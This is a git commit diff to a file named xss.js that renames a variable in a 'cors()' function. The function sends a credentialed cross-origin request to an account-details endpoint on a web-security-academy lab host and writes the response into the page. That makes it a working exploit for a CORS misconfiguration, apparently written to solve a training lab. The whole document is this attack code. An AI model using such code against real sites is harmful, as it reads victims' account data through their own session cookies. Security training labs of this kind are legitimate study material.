3f4302ff0ba3617fe120a9c6f7f3cfcebb1b9fa7
jvstmer <57935669+jvstmer@users.noreply.github.com>
2022-06-22 00:17:41 -0500

    Update xss.js

--- folder/xss.js
+++ folder/xss.js
@@ -11,11 +11,11 @@ function reqListener() {
 
 function cors() {
   document.getElementById('report').innerHTML= document.domain + ' * ';
-  var xhr = new XMLHttpRequest();
-  xhr.onload = function() {
+  var req = new XMLHttpRequest();
+  req.onload = function() {
       document.getElementById('report').innerHTML = this.responseText;
   }
-  xhr.open("GET", "https://0ae900ed03354629c0fd4c1900870036.web-security-academy.net/accountDetails", true);
-  xhr.withCredentials = true;
-  xhr.send();
+  req.open('get','https://0ae900ed03354629c0fd4c1900870036.web-security-academy.net/accountDetails',true);
+  req.withCredentials = true;
+  req.send();
 }
